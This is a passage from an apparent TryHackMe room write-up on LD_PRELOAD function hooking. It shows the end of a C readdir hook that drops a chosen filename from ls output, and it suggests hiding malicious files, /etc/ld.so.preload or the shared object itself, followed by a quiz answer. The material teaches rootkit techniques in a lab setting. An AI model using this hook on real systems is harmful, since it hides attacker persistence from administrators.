</span></span><span class=line><span class=cl>           <span class=k>if</span><span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>dir</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span><span class=n>FILENAME</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl>     <span class=k>return</span> <span class=n>dir</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><em>[Note : The readdir64 is just the 64-bit version of the same and follows the same concepts so don&rsquo;t worry about it !]</em></p><p>Breaking down our hook, we have:</p><ul><li>First we declare our usual headers with the extra <code>#include &lt;dirent.h></code> header which contains the definition of the <code>dirent</code> structure</li><li>Then, we do our usual hooking stuff: creating a function with the same definition and return type, create a function pointer and use <code>dlsym</code> to store the value of the original function in it.</li><li>Finally coming to the most crucial part, we create a while loop and fetch the pointer to the next <code>dirent</code> structure in the directory stream pointed to by <code>dirp</code> and check if the <code>d_name</code> parameter contains our string. If it doesn&rsquo;t (which is denoted by an output 0 as a result of the <code>strstr</code> function), we simply break from the loop and return the value as obtained from the original function. However, if we have a match, we iterate one more time, thereby effectively skipping over our file a return pointer to the dirent structure pertaining to the next file in the directory.</li></ul><p>It is to be noted that you can still modify the file or cat out its contents. However, it will not show in the output of the <code>ls</code> command! This can be very useful if you want to hide malicious files, alter filenames, etc. One very popular use is to hide the <code>/etc/ld.so.preload</code> file or the shared object itself!</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=img src=https://i.imgur.com/2z6edCu.png></figure><p>As you can see in the screenshot, when the malicious shared object was loaded, ls did not list our file in its output. However, we were still able to read its contents by specifically mentioning its path. Hence, you can hide files in plain sight which no-one but you would know about. Wasn&rsquo;t that pretty cool?</p><p><em>[Note : If you are stuck, <a href=https://www.linuxfordevices.com/tutorials/linux/hiding-files-in-linux-with-c target=_blank rel=noreferrer>here&rsquo;s an article by room author</a>]</em></p><h3 class="relative group">6.1<div id=61 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#61 aria-label=Anchor>#</a></span></h3><p>There are two mandatory fields of a dirent structure. One is d_name, and the other one is?</p><pre><code> d_ino
</code></pre><div class="not-prose my-6 print:hidden"><div class=ad-container><ins class=adsbygoogle style=display:block data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188 data-ad-format=auto data-full-width-responsive=true></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div></div><h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2><section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3"><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/thm_hu_cb9f1817f5f97e5a.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/tryhackme-ffuf/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>TryHackMe Ffuf</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-07-17T02:49:02+05:30>17 July 2021</time><span class="px-2 text-primary-500">&#183;</span><span>3814 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">18 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TryHackMe
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Tryhackme
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/rooms/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Rooms
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/thm/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Thm
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/ffuf/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ffuf</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/thm_hu_cb9f1817f5f97e5a.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/tryhackme-crisis/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>TryHackMe Crisis</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-07-10T15:18:30+05:30>10 July 2021</time><span class="px-2 text-primary-500">&#183;</span><span>377 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">2 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TryHackMe
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Tryhackme
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/rooms/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Rooms
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/thm/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Thm
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/crisis/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Crisis</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/thm_hu_cb9f1817f5f97e5a.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/tryhackme-postexploit/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>TryHackMe Postexploit</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-07-04T14:36:48+05:30>4 July 2021</time><span class="px-2 text-primary-500">&#183;</span><span>879 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">5 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">TryHackMe
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/tryhackme/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Tryhackme
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/rooms/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Rooms
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/thm/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Thm
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/post-exploitation/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Post-Exploitation</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article></section></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/post/tryhackme-ffuf/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;TryHackMe Ffuf
</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2021-07-17T02:49:02+05:30>17 July 2021</time>
</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/post/tryhackme-raz0rblack/><span class=leading-6>TryHackMe RazorBlack&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2021-07-18T19:31:05+05:30>18 July 2021</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/categories/ title=Categories>Categories</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">YOU CAN REUSE MY CONTENT</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://classroom.anir0y.in/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>